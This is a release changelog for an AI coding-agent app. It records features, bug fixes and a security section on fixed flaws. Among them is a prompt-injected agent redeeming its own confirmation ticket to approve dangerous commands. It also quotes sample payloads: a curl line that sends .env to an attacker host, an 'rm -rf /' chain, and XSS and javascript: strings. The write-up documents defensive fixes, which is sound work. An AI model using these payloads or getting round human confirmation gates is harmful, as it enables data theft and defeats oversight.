# Changelog

Notable changes per release. This project follows [semantic versioning](https://semver.org/):
the major version changes when stored state or the plugin API breaks, minor for
features, patch for fixes.

## 0.2.0

This release is mostly about the gap between "works" and "trustworthy": measuring
claims instead of asserting them, and fixing several places where the app could lose
data or money quietly.

### Added



**Code intelligence (LSP).** Four tools (`lsp_diagnostics`, `lsp_definition`,
`lsp_references`, `lsp_hover`) driven by a real language server — the same compiler
the user's editor uses. `grep` can say a name appears 40 times; it cannot say which
one is the declaration or what breaks if a signature changes.

**Scheduled work.** `schedule_create` / `schedule_list` / `schedule_cancel` /
`schedule_window` let the agent plan its own future work, plus a panel to manage it.
The working window governs when work may *start*: a task that comes due outside it is
deferred to the next opening, never dropped, and a run in flight is never interrupted
because the hours ended.

**Project conventions are read.** `AGENTS.md`, `CLAUDE.md`, `.cursorrules` and
`.github/copilot-instructions.md` alongside our own `.she/rules.md`. An agent that ignores
a repository's own convention file looks like an outsider — and `AGENTS.md` is what Cursor
reads, so a project arriving from Cursor keeps its rules there. Several files are MERGED (a
team that has changed tools has more than one, and honouring only the first would drop
conventions they wrote), each labelled with its source so a conflict can be reported rather
than silently blended. In a monorepo the search walks up to the repository root and stops
there: reading above it would apply a stranger's rules to the user's project.

**Documentation is checked against the code.** `pnpm check:docs` fails when a doc points at
a file that does not exist, when a quoted count has gone stale, or when a `TODO`/`FIXME`
marker appears in shipped docs. Both existing docs had drifted: `README.md` and
`CONTRIBUTING.md` told readers to run `scripts/one-click.ps1` long after the cross-platform
launcher replaced it, and `FEATURES.md` pointed at an adapter directory that had been
deleted.

**Custom stylesheets, with the guard rails that make them safe.** The whole UI is built on
CSS custom properties, so it can be rethemed without forking — `~/.she-app/theme.css` is a
plain file, editable by hand or from **Settings → Custom stylesheet**, with a live preview
(scoped, see Fixed) and a button to insert any of the common variables.
A stylesheet is the one input in this app that can make the app unusable, so the safety is
the feature: `html { display: none }` and `* { pointer-events: none }` are refused **before
they are saved**, with the line number and the reason; unbalanced braces are refused because
an unclosed rule swallows the rest of the file, so the result has nothing to do with what was
written; remote `@import` is refused because it leaks that this machine is running the app.
Deliberate choices are not policed — warnings do not block, and `?force=1` overrides errors
while marking the save as forced. Recovering does not require the UI, which is the only
property that matters when the UI is invisible: `?theme=off` in the address bar or
`POST /api/theme/disable` from curl both work. Disabling keeps the content, every save keeps
the previous version for a one-click revert (and that revert is itself revertible), and the
stylesheet lives in the app directory rather than the workspace, because a workspace-local
copy would silently restyle the app on every workspace switch — the same bug the wallpaper
had.

**Model registry.** Declare several endpoints in `she.config.yaml` and select one with
`activeModel` / `SHE_MODEL`, so "which vendor" is a config change rather than a code
change. `subagentModel` points delegated subtasks (grep, read, summarise) at a cheaper
model — the easiest cost saving available, since they do not need the reasoning model.
`${VAR}` in the config expands from the environment, so the file can be committed
without secrets.

**Runaway-loop detection, with one recovery attempt.** A loop that is *stuck* — same
tool, same arguments, same result — is detected after three rounds. The model is then
told once that its approach is producing nothing and asked to try something different;
only if it repeats again does the run stop, with an explanation. The round limit alone
only ever caught loops that never end.

**Prometheus-style process metrics** at `GET /api/metrics`: turns, latency (avg and
p95), token breakdown, tool usage and failures, and the **prompt-cache hit rate**. The
last one matters most — a cache regression is invisible until it appears on a bill.

**Cross-platform.** `scripts/she.mjs` runs on macOS, Linux and Windows, with thin
`./she.sh` and `SHE.bat` wrappers. The previous launcher was PowerShell only, so other
platforms had none.

**Container image.** `Dockerfile` for private/self-hosted deployment, plus
`SHE_HOST` and `SHE_ALLOWED_HOSTS` for binding beyond loopback and `SHE_CONFIG_FILE`
for keeping the config on a volume. The image has not been built here (no Docker
available) — `scripts/docker-check.mjs` verifies its structure.

**Verification eval.** Five tasks where a plausible answer is wrong unless the agent
actually checks: a script that exits 0 while printing an error, a test that fails, a
documented version that disagrees with the manifest.

**Release packaging.** `pnpm release` runs the gate, builds, and writes
`release/she-v<version>.{zip,tar.gz}` with a manifest recording the commit and whether
the gate passed. `pnpm release:verify` extracts that archive, installs it, builds it,
boots it and probes it — the check that separates "has the right files" from "works".

**Computer use.** `computer_click` / `computer_type` / `computer_key` /
`computer_scroll` drive the mouse and keyboard, so the agent can operate software that
has no API — the `screenshot` tool already let it *see* the desktop; these let it act.
Gated behind `SHE_ALLOW_COMPUTER_USE`, which is **deliberately separate** from
`allowAllCommands`: that flag answers "may the agent run commands in my workspace?", this
one answers "may it move my mouse and type into whatever has focus?" — a different
question, because the agent cannot see the edge of the screen and a stray click can reach
a banking tab. Windows only; every action is still `isDangerous`, so the strongest
setting requires two separate opt-ins.

**Command allowlist.** `SHE_ALLOWED_COMMANDS` is the fail-closed counterpart to the
existing denylist: the denylist can only block harmful forms someone anticipated, while
an allowlist refuses everything not named. Every command in a line is checked (so
`ls && rm -rf /` is refused even though it starts with something allowed), and shell
substitution (`$()` / backticks) is refused because what it runs cannot be inspected.
Opt-in, because switching it on breaks any workflow whose commands are not listed.

**Transient-failure retry.** 429 and 5xx are retried with exponential backoff and
jitter, honouring `Retry-After` when the provider sends one. Other 4xx fail
immediately: a bad request stays bad, and retrying only delays the error and multiplies
the bill. Previously a momentary rate limit failed the turn outright — and when a
fallback endpoint was configured, silently switched models mid-task.

**Request timeout.** A provider that accepts the connection and then goes quiet no
longer hangs the turn indefinitely. 300s by default, `SHE_LLM_TIMEOUT_MS` to change it.

**One turn at a time per conversation.** A second `POST /api/chat` while a turn is
running now gets **409** with an explanation, instead of interleaving writes into the
same history. The UI already prevented this; the API is reachable from two windows,
from scripts, and over the network, so the guarantee belongs in the server.

**`SHE_LLM_STREAM=off`.** For a proxy that buffers or drops streaming responses, the
reply then arrives in one piece at the end instead of incrementally.


**A restart check.** `check:restart` boots a server, makes changes through the API — settings,
sessions with history, a work group with a custom role, a scheduled task and working window, a
memo, a skill file — then **kills it without a graceful shutdown** and boots a second one,
asserting every piece is back. A third boot with a deliberately truncated state file asserts
recovery keeps a backup of the original bytes. The hard kill is the point: it is what a user
actually hits, and the case where a non-atomic write leaves a torn file. "Settings are not kept"
was this project's original complaint and no test had ever restarted a server, because the
whole class of bug lives in the seam between two processes rather than inside one.

**An encoding check.** `check:encoding` drives the API with Node's `fetch` — deliberately not
PowerShell, whose `Invoke-RestMethod` encodes a `-Body` string as latin1 and garbles Chinese
*before it reaches the server*, producing the same symptom as a real bug. It covers titles,
message content, work-group and role names, memos, skill filenames, the bytes on disk, the
`charset=utf-8` header, and readability of Chinese error messages, then restarts and re-checks.
A garbled title had been reported on this project and written off as the user's own input; the
round trip is in fact clean everywhere, so that symptom came from a command-line caller.

**A log-rotation check.** `check:logs` exercises the real `capLog` implementation (extracted
from the launcher, not a copy that could drift) against an oversized file, and pins that
truncation keeps the newest lines, never splits a multi-byte character, and leaves an undersized
file alone.


**Plugin end-to-end check.** `check:plugins` boots a real server with a stub model and verifies the
chain a user depends on — not the pieces in isolation: install a plugin through the API, confirm the
agent's tool list *now offers it*, confirm a call to it actually executes and returns real data
(the check asserts the summary mentions files that exist in the fixture workspace), uninstall it, and
confirm the agent no longer receives it **without a restart**. `plugins.test.ts` had ~48 good cases,
but every one called `PluginManager` directly, so the whole feature could have been inert — tools
loaded but never merged into the agent, or installs that only took effect after a restart — and
nothing would have failed. Negative-tested by removing the tool merge, which the check catches.

**Conversation migration, as opposed to attaching files.** Importing an existing Cursor / Claude Code
/ Codex conversation now creates a **real conversation** in the list, with the turns parsed out of the
original record, rather than copying a file into `.she/imports/` and appending one message to the
current chat listing its path. The old behaviour meant importing twenty conversations left the user
with one chat, no way to open any of the twenty, and nothing resembling their history — it was
"attach as context" wearing the name "import". The original record is still copied first (the point is
to preserve the primary source, not to replace it with our parse of it), and the provenance is
recorded on the session so "where did this come from" stays answerable.

### Changed



**Fonts are vendored; the app no longer contacts Google.** `index.html` linked Inter and
JetBrains Mono from `fonts.googleapis.com`, so every page load made two requests to Google —
one of them a font download. Three reasons, in increasing order of importance: it contradicted
the app's own rule (the stylesheet validator refuses a remote `@import` with the message
"这会泄露你这台机器在运行本应用"), it made an offline-first desktop app need the network to look
like itself, and it was load-bearing rather than decorative — `CSS.getPlatformFontsForNode`
showed the UI's text really renders in `Inter-Bold` on Windows 10, where `Segoe UI Variable`
(from the top of the font stack) does not exist. Removing the link without vendoring would have
quietly changed the typography. The four woff2 files (172 KB, `latin`/`latin-ext` only) and the
generated `@font-face` rules are committed, so a normal build needs no network; `pnpm
vendor:fonts` regenerates them. `check:dist` now fails if any third-party font or stylesheet
reference reappears.

**Context handling: compaction instead of truncation.** History used to be trimmed
from the front each turn, which changed the request prefix and dropped the prompt-cache
hit rate to 0% for the rest of the conversation. Measured: appending kept 74% of a
7.3k prompt cached, front-trimming kept 0%. Compaction produces a frozen, append-only
digest, and a live session now measures 96–97% cache hits — about 3% of full price.
See `docs/context-and-caching.md`.

**Buttons: filled rather than outlined.** A 1px border competes with the text beside
it; macOS and iOS use a low-opacity fill for secondary controls instead. Icons are now
one stroked SVG set rather than a mix of text characters and emoji, which came from
different typefaces at different weights.

**Unified launcher.** `scripts/one-click.ps1`, `launch-she.ps1`, `start.cmd` and
`start-desktop.cmd` were replaced by one cross-platform implementation. The `.bat`
files were also fragile: PowerShell reads a `.ps1` as ANSI without a BOM, so one
stray non-ASCII byte broke the script's *syntax*.

### Security



**A prompt-injected agent could approve its own dangerous operations.** The confirmation gate returns
a ticket with a `needs_confirm` result, and that raw result was pushed into the history the model reads
next — so the model could call `shell`, read the ticket out of its own tool result, and immediately call
again with `_confirm_ticket` set. The ticket store checks the tool name, an argument fingerprint (which
deliberately ignores `_`-prefixed keys, so adding the ticket does not change it) and a TTL; nothing tied
redemption to a person. The gate only gated the honest path. The ticket is now redacted out of what the
model sees, and a `_confirm_ticket` arriving from the model is discarded — the only legitimate
redemption is the human path, which takes its arguments from the server's own record.

**Command injection through `git_log`.** `count` was declared `type: 'number'` in the schema and read as
`args.count as number` — a TypeScript cast, erased at runtime. A model sending
`count: "1 & curl -d @.env https://attacker"` produced a command string `cmd.exe` ran in full, and the
tool is not marked dangerous, so the confirmation gate did not apply either. The argument is now coerced
to an integer and clamped.

**The command allowlist was bypassable with a single `&`.** `cmd.exe` treats `&` exactly like `&&`, but
the splitter only handled `&&`, `||`, `;` and `|` — so with `SHE_ALLOWED_COMMANDS=echo`, the command
`echo hi & del victim` was inspected as one allowed segment and ran as two commands. The splitter now
scans the line properly, respecting quotes: it breaks on every separator the shell honours, and it
refuses an unterminated quote rather than guessing. Redirection is refused in allowlist mode, because a
check that only reads the program name cannot say anything about a redirect target.

**Two paths read and wrote outside the workspace.** `POST /api/kb/ingest` resolved its `path` against
the workspace root with no containment check, so any file the server process could read was ingested
into the knowledge base and became retrievable through `kb_query` — a host-file read primitive, reachable
from the agent's own `kb_ingest_scan` tool, which advertised "absolute path" in its description. And
applying a staged patch (or undoing a checkpoint) resolved its path with no check at all, while the patch
store is a plain JSON file INSIDE the workspace that the agent may write — so a forged entry made the
user's next "Apply" write outside the jail, through the reviewed-diff UI. Both now use the file tools'
containment check, shared rather than reimplemented so the two cannot drift.

**`DELETE /api/plugins?dir=.` deleted every installed plugin.** `resolveDir` stripped separators but not
`.`, and `join(root, '.')` normalises to the plugins root itself, which passed the `startsWith` guard. It
answered 200. `dir=..` reached the parent directory, and `writeSource` had no containment check, so
`PUT /api/plugins/source?dir=..` wrote `index.mjs` and `manifest.json` into `~/.she-app/`. Plugin names
are now validated as plain directory names and containment is verified rather than assumed.

**Four skills routes tested containment with `startsWith`.** `<ws>/.she/skills-backup/x.md` starts with
`<ws>/.she/skills`, so a sibling directory whose name merely begins with the intended one was readable —
and in one route deletable. Replaced with a relative-segment check that a shared prefix cannot fool.

**MCP server `env` values were returned by `GET /api/mcp/servers`.** Those variables routinely hold
tokens, and the panel handed them back verbatim. The keys are still listed so the user can see how a
server is configured; the values are now masked.


**DNS-rebinding protection now coexists with deployment.** The guard accepted only
`127.0.0.1`, `localhost` and `[::1]`, which made container and LAN access impossible.
Literal IP addresses are now always accepted (rebinding requires a hostname) and other
hostnames need explicit opt-in via `SHE_ALLOWED_HOSTS`. Origin is validated the same
way. Verified by `scripts/host-guard-check.mjs` against a real server.

**Automation mode no longer widens permissions.** It used to force
`allowAllCommands = true` and `denyDestructiveByDefault = false`, so a fresh clone ran
with no destructive-command guard. Automation is a conversational stance; permissions
now come only from their own settings, with safe defaults.

### Fixed


**The trace panel reopened itself.** Every knowledge-base result ran `setShowTrace(true)`, so closing
the panel was futile: the next query — which the agent issues on its own — slid it back open. A panel
the user explicitly closed must stay closed. The reopen handle now carries a dot when new trace data
arrived while it was closed, so nothing is missed silently.

**The skill-profile switch showed a profile the agent was not using.** The composer read
`localStorage` and never asked the server, so with `SHE_SKILL_PROFILE=general` the settings panel
(which reads the server) showed 通用 while the composer highlighted 开发. The server is the source of
truth for which profile is *active*, and the client now reads it on boot.

**The knowledge base looked empty after an import.** The import refreshed the chat history but not the
knowledge tree, so the sidebar kept showing "no groups yet" while the library held thousands — until
the workspace was re-entered or the page reloaded. `onImported` now refreshes sessions, the tree and
the stats.

**The shared / merged knowledge base was unreachable in practice.** The controls existed only inside
Settings, about 950px down a ~2900px scrolling form, so a user looking for "merge two libraries" in
the knowledge-base area — the obvious place — found nothing. The knowledge-base section header now has
an action that opens Settings at that block.

**The import dialog asked for a decision twice.** A second, louder "import everything" button sat
beside the deliberate one, which made selecting first look like the slow path, and bulk-importing
every conversation on the machine is not a thing to make the easiest click on the screen. "Select all"
in the toolbar already covers that case in one extra step and shows what is about to be imported.

**A bulk import could reorder itself.** When no source timestamps were present, every item defaulted
to "now" — computed per item — so sorting by that field reordered the batch according to accidental
sub-millisecond differences. Sorting now applies only when the items carry real dates, which is what
it was for.



**Request bodies had no size limit.** `parseBody` accumulated every chunk, and Node imposes no ceiling,
so `POST /api/chat` with a multi-gigabyte body killed the process with a V8 heap OOM — which the
`uncaughtException` handler cannot catch. Capped at 32MB, with the raw-upload path keeping its own limit.

**Language servers were never stopped.** `Agent.dispose()` and `LspServer.stop()` existed and nothing in
the repository called either, so a session that had ever used an `lsp_*` tool left a language server
(`tsserver` indexes the whole project) running for the life of the process — once per rebuild, and the
agent set is rebuilt on every plugin change and settings save. Disposal is now wired into agent
replacement, session drop, and shutdown.

**Stopping during a patch application did nothing.** `isRunning()` read `aborter`, which only `chat()`
set, so `GET /api/chat/running` said idle while a confirm or patch-apply turn held the conversation:
the UI showed Send instead of Stop, `POST /api/chat/stop` returned `stopped: false`, and a second message
was accepted and came back as an SSE error rather than the documented 409. The abort controller is now
owned by the turn itself, so every entry point is interruptible.

**A refused patch application had already written the file.** `applyPatch` took the patch from the
store, pushed a checkpoint and wrote the file BEFORE entering the exclusive section, which then threw
`TurnInProgressError`. The user saw a 409 while the edit had landed and the patch was gone, so it could
be neither retried nor rejected.

**A stream error after a tool call was silently dropped.** Both error handlers only wrote the message
when the last message was an assistant bubble — and a tool-loop turn ends on a `role: 'tool'` row. A
failure on the round after a tool call produced no message at all, and the pending tool card sat at
`result === undefined`, rendering as an endless "执行中" animation. Errors are now always surfaced.

**The staged-write preview was a DOM XSS.** It rendered `highlight(...).html || clipCode(content)` as
`innerHTML`, so for a file with no registered grammar (`.txt`, `.log`, `.env`, a dotfile) the RAW content
became HTML, and `<img src=x onerror=...>` in any such file executed in the app origin — which holds the
API, the file tools and the stored keys. Content is model-controlled, so a prompt injection in any file
the agent read could reach it. Ungrammared content is now a React text node, and `check:uistruct` asserts
that every injection site has that branch.

**`Escape` closed a dialog and a panel at once.** `useEscapeToClose` listens on `document` and calls
`preventDefault()`; App's handler listens on `window` and never checked `defaultPrevented`, so both ran
— closing, say, the skill manager and then falling through to collapse the 组结构共振轨迹 panel. Three
panels were also missing from the chain entirely.

**Switching sessions mid-turn bled one conversation into another.** The stream handlers close over the
hook's `setMessages` and the hook survives a session switch, so a running turn kept appending tool
results and streamed text into whatever transcript was on screen — including overwriting a message in the
new conversation, since the live bubble is tracked by index. The client now detaches (without stopping
the turn server-side, so it finishes and persists into its own history). The same fix applies to work
groups, where a running wave kept appending members' messages to the next group's transcript, and to
`load()`, which had no ordering guard.

**`loadHistory()` was called with the previous session's id.** It reads `sidRef`, which is assigned
during render, so immediately after `setActiveSessionId` it still held the old conversation; the
`[activeSessionId]` effect then fetched the right one and the two responses raced, so a slow first
response could overwrite the new transcript with the old chat under the right title.

**Layout state was shared between windows.** Pane widths, focus mode and the collapsed sidebar lived in
`localStorage`, so a newly opened or reloaded window silently inherited the other window's layout (it
could come up in focus mode with the sidebar hidden) and both windows overwrote the same keys. They are
per-window now (`sessionStorage`), with a fallback read of the old keys so an existing user keeps the
layout they had.

**The 备忘录 panel could not be opened.** `StatusBar` supports `onOpenMemo` and renders the button
conditionally; App never passed it, so the fully implemented panel was unreachable.

**Markdown links were not validated.** `[click](javascript:alert(...))` in model output became a real
`href`; React 18 warns about `javascript:` URLs but still renders them. Only http(s)/mailto/relative
targets are links now — the text stays visible, it just is not clickable.

**Smaller correctness fixes.** `GET /%` returned 500 instead of falling back to `index.html`
(`decodeURIComponent` throws on a malformed escape, reported as a server bug). `POST /api/chat/rewind`
was registered twice, so only the first handler ever ran and the second's validation and response shape
were dead code. `/api/schedule/:id/run` answered `{ok: true, started: true}` when the scheduler was
disabled and nothing ran. `errors.requestFailures` and `errors.crashes` were permanently 0 — the
counters existed and nothing ever incremented them, so a crashed process reported a clean one.
`/api/kb/ingest` reported cumulative library totals as if they were what the call had just added.
The status bar's memo button was unreachable, and mention autocomplete had an unsequenced fetch (a slow
response for `@a` could overwrite the hits for `@abc`) plus a debounce timer that was never cleared on
unmount.

**A failed stylesheet save reported the wrong cause, or none at all.** `saveTheme` used
`copyFileSync` for its backup, and on Windows that carries the source's attributes with it — so
a read-only `theme.css` made its own `.prev` copy read-only, and "restore the previous version",
the action a user reaches for precisely when something is wrong, then died with a bare
`EPERM: operation not permitted`. A write failure also fell through to the generic handler as
`{"error":"Internal Server Error"}`, which says nothing about which file is involved or that the
problem is permissions rather than syntax; and the editor turned that into "fix the errors
first", actively misleading when there is nothing to fix. Writes now fail with the path, the
cause and the remedy, and the editor shows the server's message verbatim.

**The stylesheet is now checked against the situations a file can be in.** Beyond the syntax
rules, `check:theme` covers a read-only file, a directory in the file's place, non-UTF-8 bytes
from a GBK editor, a leading BOM, CRLF, a symlink (how a dotfiles manager wires it up), an
empty-but-whitespace file, eight concurrent saves, a 200 KB stylesheet (validated in ~30 ms,
since the editor re-checks on every keystroke), and a workspace switch — the last because the
wallpaper once silently changed when the workspace did, and a stylesheet stored the same way
would silently restyle the whole app on every switch.

**An XSS-shaped stylesheet was verified inert, and the invariant pinned.** Saving
`</style><script>window.__pwned = 1</script>` was checked in a real browser: the script never
ran, the injected element stayed a `<style>` with zero child elements, and the legitimate CSS in
the same file still applied. The property that makes this true is `textContent` rather than
`innerHTML`, which no test would have noticed being swapped — so `check:uistruct` asserts it.

**Four checks could not fail for what they claimed.** `check:docs` reported PASS while four stale
counts and a deleted script reference sat in the docs it was supposed to police: its file-existence
test skipped any missing path whose parent directory existed (which is all of them), and its count test
only asserted that the documents agreed *with each other* — so `999 / 999` everywhere would have
passed. `check:data` had two assertions whose entire condition was `healthy` ("the server booted"), and
one of them looked for a `.bak-` suffix the code has never written (it writes `.unusable-`).
`check:subagent`'s recursion assertion built a child with no runner, so `task_spawn` could not have been
present regardless of the filter it claimed to test. `check:lsp` exited 0 when no language server was
installed — indistinguishable, in a green gate, from 18 assertions having run.

All four now assert the property they name. `check:docs` runs the unit suites and compares the quoted
total to what the runners report; `check:data` checks that the quarantine file exists under the name the
code actually uses and holds the original bytes; `check:lsp` fails when it cannot run; and a check script
nobody documented is a failure rather than a printed note. Negative-tested by reintroducing each defect.

**A window's conversation could be replaced underneath it.** The server keeps one global active
session, and every request carries an explicit `session_id` — so that value is only a hint. The
UI treated it as an instruction and re-adopted it on every session-list refresh, which happens
on **both edges of every turn**. A second window selecting its own chat, or a scheduled task
running headlessly and activating the session it works in, would therefore pull an open window
onto a different conversation mid-sentence, with no error. Selecting a conversation is now the
window's own decision, taken through one tested function (`lib/sessionChoice.ts`); the server's
value is used only as a starting point for a window that has not chosen. The choice is also
persisted per window (`sessionStorage`, not `localStorage`), so reloading a second window no
longer inherits the first window's conversation, and a stored id is validated against the list
so a conversation deleted elsewhere cannot leave a permanently empty chat. Entering a workspace
resets the selection, since a saved id belongs to the workspace being left.

**146 MB of dead wallpaper inside a project directory.** The wallpaper moved to the app
directory (it is a user preference, like the theme) but nothing removed what the old
per-workspace version had already written. On this machine that was a 146 MB video sitting in
`<workspace>/.she/background/`, read by nobody. It cannot just be deleted on sight — a user may
have put a file there deliberately — so the boot-time migration removes it only when an
app-global copy of the **same file with the same size** exists, which makes it a duplicate rather
than data. Non-duplicates, and files that exist only in the workspace, are left alone; the
outcome is logged either way. `check:restart` asserts both the removal and the two
must-not-delete cases.

**Turning off "allow all commands" turned it back on.** The Settings UI links the two toggles as
a convenience — enabling automation mode pre-ticks "allow all commands" — but they are separate
switches, and the server only honoured an explicit `allowAllCommands` in one direction. Sending
`{ automationMode: true, allowAllCommands: false }` applied `false` and then silently overwrote
it with `true`, and persisted that: the user switched the dangerous option **off** and the server
switched it back **on**. The explicit value now wins in both directions. Found by a new check that
restarts a real server; no unit test asked what happens when the two fields disagree.

**Adding a work-group role failed with an opaque 500 when the model was unreachable.** Every role
gets an AI-written skill when none is supplied, and that call needs the model — so an offline or
misconfigured install could not add a role at all, receiving `{"error":"Internal Server Error"}`
with no reason and no role. A skill is a convenience, not a prerequisite: generation failure now
leaves the skill empty (the user can write it) and is logged, so the operation succeeds.
`POST /api/cluster/generate-skill`, where generation *is* the job, now returns **502** with the
underlying cause instead of a bare 500.

**`crash.log` contained no crashes.** The launcher redirected the server's whole stderr stream
to `.she/crash.log` — the same path the server's crash handler appends real reports to. The file
on this machine held 62 lines, 60 of them routine warnings ("Refused request: …", "session not
found") and **zero** crash reports. A user opening it would reasonably conclude the app crashes
constantly, and the one time it does crash the report is buried in noise. stderr now goes to
`.she/server-err.log`, and `crash.log` is written only by the crash handler.

**Logs grew without bound.** Four append-only logs — the launcher's two, the desktop shell's
three, and the server's crash log — had nothing rotating them; `launcher-server.log` had reached
7 MB. This is the shape of bug that surfaces much later as "why is my disk filling up" rather
than as an error. All of them are now capped, keeping the newest part (the recent lines are what
explain a failure), with the cut advanced to a line boundary so a multi-byte character is never
split. A crash *loop* is the worst case, so `crash.log` is capped too.

**The startup-timeout message pointed at the wrong file.** It told the user to look at
`.she/crash.log` for an API that failed to start, but a startup failure never appears there —
the relevant logs are `desktop-server.log` and `desktop-server.err.log`.

**A one-line edit silently disabled the whole feature, and no test noticed.** A bulk replace
inserted a literal `\n` instead of a newline, merging two comment lines into one — and the
merged line began with `//`, so the statement below it was swallowed into the comment. The
stylesheet element was still created, never given any CSS, and the injected sheet was always
empty: saving a theme appeared to work and did nothing.

Every test passed, and the reason is worth stating plainly: **all of them read source, and the
browser runs a bundle.** `check:dist` now asserts that the built bundle actually contains the
load-bearing wiring (the element id, the selector promotion, both escape hatches) and that it
is not older than the newest source file. Negative-tested by reintroducing the exact break.

**`:root` variables were ignored in the light theme.** The app declares its dark tokens in
`:root` (specificity 0,1,0) and its light tokens in `[data-theme="light"]` (0,1,1), so a user
writing the documented `:root { --accent: … }` won in dark mode and silently lost in light —
the worst shape for this bug, because it reads as "the feature is broken" and gives no clue
that a selector is merely out-specified. The injected sheet now promotes `:root` and `html`
to also match `html[data-theme]`, which ties the app's themed blocks and wins on source order.
Applied at injection time, so the file on disk stays exactly what the user wrote.
Found by driving a real browser in both themes; the unit tests only ever exercised one.

**A saved stylesheet applied only while the editor was open.** The hook that injects the
stylesheet into the document was called from inside the editor panel, so a theme survived a
page load but not a restart — and `?theme=off` became a silent no-op on a normal load,
because nothing had been applied to escape from. Found by driving a real browser: the unit
tests covered the validator and the endpoints, and none of them looked at whether the saved
CSS reached the document. The hook now runs at the app root, and the preview panel takes the
state as a prop.

**Overlay panels were mounted in one render branch only.** `App` returns early for the Home
page, so a panel declared after that point cannot be opened from it. The landing page's
Settings and skill buttons were dead, and later the schedule panel and the stylesheet editor
could be reached from only one of the two screens. The overlays are now one fragment included
in both returns, so a new panel cannot land in a single branch by accident — and
`check:uistruct` derives the set of panels Home can open and fails if any of them is not
shared.

**Two check scripts could probe the developer's own server.** `security-check` and
`theme-check` passed `SHE_PORT` only through the `.env` file they wrote, but ambient
environment variables beat `.env` — so a developer who had exported `SHE_PORT` would have
their running dev server probed instead of the code under test, with a confusing
`EADDRINUSE` when the port was busy. Both now pin the settings they depend on in the child
environment.

**The localisation ratchet under-counted translated strings.** A `t(...)` call formatted
across several lines — the normal shape for one that takes placeholder values — was not
recognised as translated, so every line after the first was reported as hardcoded. The check
now finds the whole call, tracking nesting and strings, and blanks it out while preserving
newlines so reported line numbers still match the file. Without this, converting a component
did not lower the count, which would have made the ratchet meaningless.

**Data loss on a corrupt state file.** Both the session list and the work-group list
treated any parse failure as "no data" and then saved that empty state over it. A
truncated write, a hand-edit, or a version mismatch destroyed every conversation with
no copy left behind. Unusable files are now moved aside and reported, with the reason
and the backup path. The task scheduler behaves the same way.

**Cross-directory overwrite.** `hasAnySessions` returned `false` for a file that
existed but could not be parsed, so legacy recovery — whose stated rule was "only fill
a gap" — replaced the user's own session file with conversations from a different
directory. Only a genuinely absent file is treated as a gap now.

**First LSP answer was wrong.** A cold language server resolves "go to definition" on
an imported symbol to the *import line*, stably, for about three seconds. The first
answer is now awaited properly rather than returned early.

**Stale diagnostics after an edit.** Diagnostics were cached per file, so a second
check after a fix reported errors that no longer existed. Results are now cached
against the file content they describe.

**`SHE_KB_PATH` default pointed at the author's machine.** A new install defaulted its
knowledge base to `D:/AGI/she-kb/kb.sqlite`, which does not exist on anyone else's
computer. The default is now derived from the workspace.

**Version drift.** The version was hardcoded in three places, so bumping
`package.json` left `/api/health` reporting a stale number. It is read from the
manifest.

**The config parser silently dropped anything it did not understand.** It was
hand-rolled, walked lines with `/^([\w.]+)\s*:\s*(.*)/`, and did `if (!match) continue`.
It could not express a **list** at all, so a `models:` registry would be written by a
user, ignored without a word, and the default used instead — and a structural typo
produced no feedback whatsoever. Replaced with a real YAML parser; a malformed file now
fails startup with the filename and line number, and unrecognised top-level keys are
reported because a setting that looks applied but is not is worse than one that fails.

**A dropped response stream discarded everything already received.** The user had
watched text stream in, and it vanished — while those tokens had already been billed.
Partial content is now kept, the turn says it was interrupted, and the user can say
"continue". Two cases are handled separately because they need different treatment:
a break **before** any content is retried (nothing was shown, nothing lost), while a
break **after** content is kept and NOT retried (retrying would show two different
partial answers to one turn and bill for both).

**Quoted arguments were corrupted on Windows, silently.** `spawn('cmd.exe', ['/c', cmd])`
let cmd.exe re-parse the command line, so quotes did not survive. Measured:

    node -e "console.log(1)"      → (no output, exit 0)
    node -p "1+1"                 → 1+1            (should be 2)
    node -e "console.log('a b')"  → SyntaxError

The exit-code-0 cases are the dangerous ones: every command with a quoted argument —
`git commit -m "..."`, `grep "pattern" file`, most one-liners — did something other than
what was asked and reported success. Nothing in the transcript looks wrong. Fixed by
using `shell: true`, which makes Node emit the platform-correct command line.

**A command path containing spaces was misparsed into the allowlist check.**
`"C:\Program Files\nodejs\node.exe" x.js` yielded `program`, because the token was split
on whitespace before quotes were stripped.

**An incomplete tool call could be executed.** Its arguments are JSON assembled from
deltas, so a truncated call is malformed; running it would act on wrong arguments —
writing the wrong file, running the wrong command. They are now discarded and reported.

**A stream that ended without a finish marker was treated as complete.** Destroying the
socket does not always surface as an exception: the body can simply END, which looks
identical to a normal completion. That is how a truncated answer got presented as if it
were finished. The end marker (`[DONE]` or `finish_reason`) is now required.

**An endpoint that ignores `stream: true` produced an empty reply, silently.** Feeding
a JSON body to the SSE reader yielded an assistant message with no content — the turn
looked successful. It is now detected by content type and parsed normally, with a note
that the endpoint ignored the request.

**A stuck loop gave up without trying anything else.** Detection stopped the run and
asked the user, which throws away a task that was one correction from working. The
model is now told once what is repeating and asked for a different approach.

**The loop-recovery prompt leaked into the transcript.** It was pushed onto `history`,
which is persisted and rendered — and as a `user` message, so the user would see a line
they never wrote. It now goes into the request only.

**`SHE_ALLOWED_HOSTS` had to include the port.** An operator naturally writes
`she.example.com`; a browser sends `she.example.com:4577`. Comparing the exact strings
made a correct entry silently do nothing.

**Route shadowing.** `PUT /api/schedule/window` was declared after
`PUT /api/schedule/:id`, and routes match in order — so setting the working window was
read as updating a task whose id was "window".

### Testing



Test count went from ~40 to **631**, plus twenty check scripts wired into `check:all`
(security, data safety, subagents, LSP, host guard, accessibility, portability, metrics,
scheduling, i18n coverage, control styling, Docker structure, custom stylesheets, UI structure,
built-bundle wiring, log rotation, a real restart cycle, encoding round-trips, injection
regressions) and three evaluators (retrieval, agent end-to-end, self-verification). `check:all` runs
the build, the tests, the evaluators and every check script on a fresh clone — and `check:docs`
re-runs the unit suites to verify the count quoted here is the real one.

The two LLM-backed evaluators grade on a **rate with a floor**, not on a perfect score:
they measure agent behaviour, which varies between runs, and a gate that goes red at
random is one people learn to ignore. A real regression still drops the rate.

Several checks were themselves verified by deliberately introducing the failure they
exist to catch — which found two bugs in the checks: the accessibility icon-button rule
missed single-line JSX, and the dead-CSS rule counted classes that are assembled at
runtime (`styles['step_' + status]`).

Three harness bugs were found and pinned by their own assertions: the UI `fetch` stub
was installed once at module load while the runner was configured with `restoreMocks`,
so component tests were issuing **real** HTTP requests; teardown ordering let deferred
rejections set state after unmount, producing `act` warnings that looked like product
bugs; and the host-guard check used `fetch`, which silently ignores a `Host` header —
so it passed no matter what the guard did.

The i18n check is a ratchet: it fails when the count of hardcoded Chinese strings
